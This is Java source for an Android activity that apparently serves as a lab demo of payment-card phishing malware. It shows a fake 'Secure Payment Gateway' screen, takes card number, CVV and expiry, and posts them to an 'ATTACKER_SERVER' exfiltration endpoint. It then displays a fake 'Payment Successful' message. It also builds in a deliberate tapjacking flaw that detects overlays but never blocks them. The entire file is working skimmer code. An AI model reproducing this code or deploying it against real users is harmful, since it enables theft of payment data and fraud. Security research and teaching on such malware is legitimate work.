package com.example.trustmebro;

import android.annotation.SuppressLint;
import android.os.Bundle;
import android.view.MotionEvent;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.MediaType;
import okhttp3.Response;
import org.json.JSONObject;

import java.io.IOException;

public class OverlayCaptureActivity extends AppCompatActivity {

    private static final String TAG = "TrustMeBro";
    private static final String ATTACKER_SERVER = "http://10.0.2.2:8080/exfil";

    private EditText cardNumberInput;
    private EditText cvvInput;
    private EditText expiryInput;
    private TextView statusView;
    private OkHttpClient httpClient;

    @SuppressLint("ClickableViewAccessibility")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_overlay_capture);

        cardNumberInput = findViewById(R.id.card_number_input);
        cvvInput = findViewById(R.id.cvv_input);
        expiryInput = findViewById(R.id.expiry_input);
        statusView = findViewById(R.id.status_view);
        Button payButton = findViewById(R.id.pay_button);
        Button backButton = findViewById(R.id.back_button);

        httpClient = new OkHttpClient.Builder().build();

        // UI is now clean and realistic - no debug info shown to user
        statusView.setText("Secure Payment Gateway");

        // VULNERABILITY: Tapjacking detection logic exists but fails to block the action
        payButton.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                if ((event.getFlags() & MotionEvent.FLAG_WINDOW_IS_OBSCURED) != 0) {
                    Log.e(TAG, "[VULNERABILITY] Tapjacking confirmed: Window is obscured by an external overlay.");
                }
            }
            return false;
        });

        payButton.setOnClickListener(v -> onPayButtonPressed());
        backButton.setOnClickListener(v -> finish());

        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
    }

    private void onPayButtonPressed() {
        final String card = cardNumberInput.getText().toString();
        final String cvv = cvvInput.getText().toString();
        final String expiry = expiryInput.getText().toString();

        if (card.isEmpty()) {
            Toast.makeText(this, "Please enter card details", Toast.LENGTH_SHORT).show();
            return;
        }

        statusView.setText("Authorizing with bank...");
        
        // Exfiltrate full data on Pay
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("exfil_type", "complete_payment");
                payload.put("card_number", card);
                payload.put("cvv", cvv);
                payload.put("expiry", expiry);
                payload.put("malware_triggered", true);
                sendRequest(payload);
            } catch (Exception e) {
                Log.e(TAG, "[EXFIL_ERROR] " + e.getMessage());
            }
        }).start();

        cardNumberInput.postDelayed(() -> {
            statusView.setText("Payment Successful!");
            Toast.makeText(this, "Transaction TXN-" + System.currentTimeMillis() % 10000 + " Completed", Toast.LENGTH_LONG).show();
            finish();
        }, 1500);
    }

    private void sendRequest(JSONObject payload) throws IOException {
        RequestBody body = RequestBody.create(payload.toString(), MediaType.parse("application/json"));
        Request request = new Request.Builder()
                .url(ATTACKER_SERVER)
                .post(body)
                .header("Connection", "close")
                .build();

        try (Response response = httpClient.newCall(request).execute()) {
            if (response.isSuccessful()) {
                Log.d(TAG, "[EXFIL_SUCCESS] Card data stolen and sent to C2");
            }
        }
    }
}